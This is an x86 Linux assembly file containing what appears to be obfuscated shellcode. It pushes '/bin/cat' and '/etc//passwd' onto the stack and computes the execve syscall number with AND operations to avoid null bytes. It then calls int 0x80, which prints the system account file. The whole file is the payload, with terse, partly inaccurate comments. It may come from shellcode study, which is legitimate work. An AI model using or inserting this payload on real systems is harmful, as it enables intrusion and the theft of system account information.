
global _start
section .text
_start:
        mov eax, -1		; put 0xfffff in eax
        inc eax			; eax becomes zero
        cdq			; zeroes edx
        lea ebx, [esp-0xc]
        push edx
        push dword 0x7461632f   ; tac/
        push dword 0x6e69622f   ; nib/
        ;mov ebx, esp
        
        lea ecx, [ebx-0x10]     ; use ebx as ou "stack pointer"
        
        push edx
        push dword 0x64777374   ; dwss
        push dword 0x61702f2f   ; ap//
        push dword 0x6374652f   ; cte/
        ;push dword 0x34a2b237  ;gibberish
       
        
        ;mov ecx, esp
        mov ax, 0x4a2f     
        ;and dword [esp], 0xcb5d4dc8     ; zeroes esp
        ;mov al, 0xb

        push edx
        xor byte [esp+0xc], 0x7
        push ecx
        push ebx
        mov ecx, esp
        and ax,0x358b      ; using and operations to resulting in nulling eax
        int 0x80
